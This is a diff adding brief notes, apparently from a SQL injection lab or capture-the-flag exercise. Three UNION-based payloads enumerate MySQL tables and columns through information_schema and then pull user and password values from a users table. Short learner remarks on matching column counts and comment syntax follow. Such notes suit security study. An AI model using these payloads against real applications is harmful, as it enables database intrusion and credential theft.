@@ -1,0 +1,9 @@
+1. ' OR '1'='1' UNION SELECT table_name, NULL FROM information_schema.tables WHERE '1' = '1
+2. ' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users
+3. ' UNION SELECT user, password FROM users WHERE '1' = '1
+
+Learning how the information schema works for mysql seems important.
+
+Basic SQL, but you need to make sure both tables have the same number of columns returned.
+
+For some reason, using -- does not seem to work.
